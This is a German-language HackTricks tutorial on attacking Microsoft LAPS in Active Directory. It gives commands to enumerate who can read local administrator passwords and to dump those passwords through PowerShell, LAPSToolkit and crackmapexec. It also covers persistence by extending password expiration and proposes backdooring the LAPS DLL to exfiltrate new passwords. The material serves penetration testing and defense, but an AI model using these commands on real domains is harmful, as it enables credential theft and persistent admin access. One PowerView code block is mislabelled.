# LAPS

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Grundlegende Informationen

Local Administrator Password Solution (LAPS) ist ein Tool zur Verwaltung eines Systems, bei dem **Administratorpasswörter**, die **eindeutig, zufällig und häufig geändert** sind, auf domänenbeigetretenen Computern angewendet werden. Diese Passwörter werden sicher in Active Directory gespeichert und sind nur für Benutzer zugänglich, denen über Zugriffssteuerungslisten (ACLs) Berechtigungen erteilt wurden. Die Sicherheit der Passwortübertragungen vom Client zum Server wird durch die Verwendung von **Kerberos Version 5** und **Advanced Encryption Standard (AES)** sichergestellt.

Bei der Implementierung von LAPS in den Computerobjekten der Domäne führen zwei neue Attribute zu: **`ms-mcs-AdmPwd`** und **`ms-mcs-AdmPwdExpirationTime`**. Diese Attribute speichern das **Klartext-Administratorpasswort** und **dessen Ablaufzeit**, jeweils.

### Überprüfen Sie, ob aktiviert
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Passwortzugriff

Sie könnten die **rohe LAPS-Richtlinie** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` herunterladen und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.

Darüber hinaus können die **nativen LAPS PowerShell-Cmdlets** verwendet werden, wenn sie auf einem von uns zugänglichen Rechner installiert sind:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** kann auch verwendet werden, um herauszufinden, **wer das Passwort lesen kann und es zu lesen**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Das [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) erleichtert die Auflistung von LAPS mit mehreren Funktionen.\
Eine davon ist das Parsen von **`ExtendedRights`** für **alle Computer mit aktiviertem LAPS**. Dies zeigt **Gruppen**, die speziell dazu berechtigt sind, LAPS-Passwörter zu lesen, die oft Benutzer in geschützten Gruppen sind.\
Ein **Konto**, das einen Computer in eine Domäne aufgenommen hat, erhält `Alle erweiterten Rechte` über diesen Host, und dieses Recht gibt dem **Konto** die Möglichkeit, **Passwörter zu lesen**. Die Auflistung kann ein Benutzerkonto zeigen, das das LAPS-Passwort auf einem Host lesen kann. Dies kann uns helfen, **spezifische AD-Benutzer** zu identifizieren, die LAPS-Passwörter lesen können.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS-Passwörter mit Crackmapexec**
Wenn kein Zugriff auf ein Powershell besteht, können Sie dieses Privileg remote über LDAP missbrauchen, indem Sie es verwenden
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistenz**

### **Ablaufdatum**

Sobald Administrator, ist es möglich, die Passwörter zu erhalten und zu verhindern, dass eine Maschine ihr Passwort aktualisiert, indem das Ablaufdatum in die Zukunft gesetzt wird.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Das Passwort wird trotzdem zurückgesetzt, wenn ein **Administrator** das **`Reset-AdmPwdPassword`**-Cmdlet verwendet; oder wenn **Das Zulassen einer Passwortablaufzeit, die länger als vom Richtlinie erforderlich, ist** im LAPS-Gruppenrichtlinienobjekt aktiviert ist.
{% endhint %}

### Hintertür

Der originale Quellcode für LAPS kann [hier](https://github.com/GreyCorbel/admpwd) gefunden werden, daher ist es möglich, eine Hintertür im Code zu platzieren (zum Beispiel innerhalb der `Get-AdmPwdPassword`-Methode in `Main/AdmPwd.PS/Main.cs`), die irgendwie **neue Passwörter exfiltriert oder irgendwo speichert**.

Dann einfach die neue `AdmPwd.PS.dll` kompilieren und auf die Maschine unter `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` hochladen (und das Änderungsdatum ändern).

## Referenzen
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks-Repository](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud-Repository](https://github.com/carlospolop/hacktricks-cloud) senden**.

</details>
